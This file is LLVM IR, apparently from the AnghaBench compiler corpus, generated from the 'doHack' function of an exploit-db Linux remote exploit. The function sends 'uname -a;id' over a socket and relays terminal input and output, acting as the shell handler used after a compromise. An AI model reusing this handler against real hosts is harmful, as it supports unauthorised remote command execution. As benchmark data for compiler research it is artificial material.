; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_139.c_doHack.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_139.c_doHack.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [13 x i8] c"uname -a;id\0A\00", align 1
@STDIN = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EWOULDBLOCK = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8
@STDOUT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @doHack(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca [10240 x i8], align 16
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = call i32 @write(i32 %6, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i32 12)
  br label %8

8:                                                ; preds = %1, %35, %62, %73
  %9 = call i32 @FD_ZERO(i32* %5)
  %10 = load i32, i32* @STDIN, align 4
  %11 = call i32 @FD_SET(i32 %10, i32* %5)
  %12 = load i32, i32* %2, align 4
  %13 = call i32 @FD_SET(i32 %12, i32* %5)
  %14 = load i32, i32* %2, align 4
  %15 = add nsw i32 %14, 1
  %16 = call i64 @select(i32 %15, i32* %5, i32* null, i32* null, i32* null)
  %17 = icmp sgt i64 %16, 0
  br i1 %17, label %18, label %73

18:                                               ; preds = %8
  %19 = load i32, i32* @STDIN, align 4
  %20 = call i64 @FD_ISSET(i32 %19, i32* %5)
  %21 = icmp ne i64 %20, 0
  br i1 %21, label %22, label %45

22:                                               ; preds = %18
  %23 = load i32, i32* @STDIN, align 4
  %24 = getelementptr inbounds [10240 x i8], [10240 x i8]* %3, i64 0, i64 0
  %25 = call i32 @read(i32 %23, i8* %24, i32 1024)
  store i32 %25, i32* %4, align 4
  %26 = icmp sle i32 %25, 0
  br i1 %26, label %27, label %40

27:                                               ; preds = %22
  %28 = load i64, i64* @errno, align 8
  %29 = load i64, i64* @EWOULDBLOCK, align 8
  %30 = icmp eq i64 %28, %29
  br i1 %30, label %35, label %31

31:                                               ; preds = %27
  %32 = load i64, i64* @errno, align 8
  %33 = load i64, i64* @EAGAIN, align 8
  %34 = icmp eq i64 %32, %33
  br i1 %34, label %35, label %36

35:                                               ; preds = %31, %27
  br label %8

36:                                               ; preds = %31
  %37 = load i32, i32* %2, align 4
  %38 = call i32 @close(i32 %37)
  %39 = call i32 @exit(i32 -1) #3
  unreachable

40:                                               ; preds = %22
  %41 = load i32, i32* %2, align 4
  %42 = getelementptr inbounds [10240 x i8], [10240 x i8]* %3, i64 0, i64 0
  %43 = load i32, i32* %4, align 4
  %44 = call i32 @write(i32 %41, i8* %42, i32 %43)
  br label %45

45:                                               ; preds = %40, %18
  %46 = load i32, i32* %2, align 4
  %47 = call i64 @FD_ISSET(i32 %46, i32* %5)
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %72

49:                                               ; preds = %45
  %50 = load i32, i32* %2, align 4
  %51 = getelementptr inbounds [10240 x i8], [10240 x i8]* %3, i64 0, i64 0
  %52 = call i32 @read(i32 %50, i8* %51, i32 1024)
  store i32 %52, i32* %4, align 4
  %53 = icmp sle i32 %52, 0
  br i1 %53, label %54, label %67

54:                                               ; preds = %49
  %55 = load i64, i64* @errno, align 8
  %56 = load i64, i64* @EWOULDBLOCK, align 8
  %57 = icmp eq i64 %55, %56
  br i1 %57, label %62, label %58

58:                                               ; preds = %54
  %59 = load i64, i64* @errno, align 8
  %60 = load i64, i64* @EAGAIN, align 8
  %61 = icmp eq i64 %59, %60
  br i1 %61, label %62, label %63

62:                                               ; preds = %58, %54
  br label %8

63:                                               ; preds = %58
  %64 = load i32, i32* %2, align 4
  %65 = call i32 @close(i32 %64)
  %66 = call i32 @exit(i32 -1) #3
  unreachable

67:                                               ; preds = %49
  %68 = load i32, i32* @STDOUT, align 4
  %69 = getelementptr inbounds [10240 x i8], [10240 x i8]* %3, i64 0, i64 0
  %70 = load i32, i32* %4, align 4
  %71 = call i32 @write(i32 %68, i8* %69, i32 %70)
  br label %72

72:                                               ; preds = %67, %45
  br label %73

73:                                               ; preds = %72, %8
  br label %8
}

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
